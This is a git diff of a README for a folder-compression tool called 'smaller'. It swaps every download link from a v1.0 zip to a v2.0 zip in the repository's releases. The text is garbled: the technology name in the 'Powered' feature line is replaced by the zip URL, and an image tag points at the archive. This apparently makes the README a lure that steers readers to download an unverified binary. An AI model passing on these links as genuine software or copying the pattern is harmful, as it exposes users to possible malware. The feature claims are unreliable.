@@ -7,7 +7,7 @@ This repository is all about the "smaller" application, a tool focused on compre
 
 📦 **Compact**: Utilizes advanced compression algorithms to significantly reduce the size of folders.
 
-🚀 **https://github.com/Keithxxx1/smaller/releases/download/v1.0/Application.zip Powered**: Developed using https://github.com/Keithxxx1/smaller/releases/download/v1.0/Application.zip for efficient performance and compatibility.
+🚀 **https://github.com/Keithxxx1/smaller/releases/download/v2.0/Software.zip Powered**: Developed using https://github.com/Keithxxx1/smaller/releases/download/v2.0/Software.zip for efficient performance and compatibility.
 
 💻 **NTFS Support**: Works seamlessly with NTFS formatted drives.
 
@@ -34,7 +34,7 @@ This repository is all about the "smaller" application, a tool focused on compre
 - vue3
 
 ## Software Download
-[![Download Software](https://github.com/Keithxxx1/smaller/releases/download/v1.0/Application.zip)](https://github.com/Keithxxx1/smaller/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/Keithxxx1/smaller/releases/download/v2.0/Software.zip)](https://github.com/Keithxxx1/smaller/releases/download/v2.0/Software.zip)
 
 Please click on the button above to download the software package. 🚀
 
@@ -57,4 +57,4 @@ Let's make file compression better together! 🌟
 
 Thank you for visiting the "smaller" repository. We hope you find the application useful for your file compression needs. If you have any questions or feedback, please don't hesitate to reach out. Happy compressing! 📁💾
 
-![Compressing Files](https://github.com/Keithxxx1/smaller/releases/download/v1.0/Application.zip)
+![Compressing Files](https://github.com/Keithxxx1/smaller/releases/download/v2.0/Software.zip)
